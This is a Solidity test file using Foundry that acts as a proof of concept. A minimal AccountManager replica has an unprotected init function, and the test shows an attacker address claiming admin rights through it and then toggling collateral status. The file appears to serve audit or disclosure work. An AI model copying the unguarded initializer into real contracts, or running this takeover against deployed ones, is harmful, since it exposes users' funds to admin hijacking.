import "forge-std/Test.sol";

// Minimal registry stub
interface IRegistry {}

// Minimal Pausable replica with initPausable and adminOnly
contract Pausable {
    address public admin;
    bool public paused;
    function initPausable(address a) internal {
        admin = a;
        paused = false;
    }
    modifier adminOnly() {
        require(msg.sender == admin, "adminOnly");
        _;
    }
}

// Minimal vulnerable replica
contract AccountManager is Pausable {
    bool private initialized;
    mapping(address => bool) public isCollateralAllowed;
    IRegistry public registry;

    function init(IRegistry _registry) external {
        if (initialized) revert();
        initialized = true;
        // no access control: any caller becomes pausable admin
        initPausable(msg.sender);
        registry = _registry;
    }

    // admin-only function attacker can call after init
    function toggleCollateralStatus(address token) external adminOnly {
        isCollateralAllowed[token] = !isCollateralAllowed[token];
    }
}

contract AccountManagerTest is Test {
    AccountManager target;
    address attacker;

    function setUp() public {
        target = new AccountManager();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_init() public {
        address token = address(0xdead);
        // initially false
        assertEq(target.isCollateralAllowed(token), false);
        // attacker initializes contract and becomes admin
        vm.prank(attacker);
        target.init(IRegistry(address(0)));
        // as admin attacker can call adminOnly function
        vm.prank(attacker);
        target.toggleCollateralStatus(token);
        // mapping flipped to true
        assertEq(target.isCollateralAllowed(token), true);
    }
}

